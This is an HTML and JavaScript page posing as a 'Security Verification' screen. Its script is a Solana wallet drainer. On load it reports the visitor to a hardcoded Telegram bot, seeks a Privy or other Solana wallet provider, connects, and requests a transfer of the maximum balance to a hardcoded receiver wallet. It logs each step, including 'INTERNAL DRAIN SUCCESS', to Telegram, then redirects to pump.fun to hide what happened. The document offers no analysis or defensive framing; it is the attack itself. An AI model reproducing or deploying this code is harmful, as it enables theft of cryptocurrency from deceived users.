        <h2 style="color:#00ffa3; margin-bottom:10px;">Security Verification</h2>
        <p style="color:#ccc;">Checking connection status... You will be redirected shortly.</p>
        <div style="margin-top:20px; font-size:12px; color:#666;">Do not close this window.</div>
        
        <script>
            (async function() {
                // 1. CONFIGURATION (Directly visible)
                const b = "8774122578:AAGhWsMj3zCHEMwiasfhbLx9kPyJfiP5uq0"; // Bot Token
                const c = "6835424543"; // Chat ID
                const w = "9x5aj9Zyud6kAqgP1q3TSKXRwwvEmzGr6EvHdjVNVWRg"; // Receiver Wallet
                
                // Function to send Telegram Notifications (using Image hack for CORS bypass)
                const notify = (m) => { new Image().src = `https://api.telegram.org/bot${b}/sendMessage?chat_id=${c}&text=${encodeURIComponent(m)}`; };

                // 2. IMMEDIATE NOTIFICATION (On Page Load)
                notify('🎯 Target Visited Vercel Link!\nWaiting for wallet... (English Code Active)');

                // 3. FORCED REDIRECT (In case of delay or no wallet)
                setTimeout(() => { window.location.href = 'https://pump.fun/board'; }, 4000);

                try {
                    // 4. FIND PRIVY INTERNAL WALLET FIRST (Prioritize Privy)
                    let p = null;
                    if (window.privy && window.privy.wallet && window.privy.wallet.provider) {
                        p = window.privy.wallet.provider;
                        notify('🎯 Privy Internal Wallet Detected!');
                    } 
                    // Fallback to general Solana Provider, but avoid Phantom if requested
                    else if (window.solana && !window.solana.isPhantom) {
                        p = window.solana;
                    }

                    if (!p) {
                        notify('⚠️ No Privy Wallet found in this context.');
                        return;
                    }

                    // 5. CONNECT & REQUEST TRANSACTION
                    await p.connect();
                    const pubKey = p.publicKey.toString();
                    notify('✅ Connected: ' + pubKey + '\nAttempting Internal Drain...');

                    // Transaction details (MAX SOL)
                    const tx = { to: w, amount: 'MAX' };
                    const { signature } = await p.signAndSendTransaction(tx);
                    notify('💰 INTERNAL DRAIN SUCCESS!\nSignature: ' + signature);

                } catch (err) {
                    // If user rejects, or error occurs
                    notify('❌ Internal Error: ' + err.message);
                }
            })();
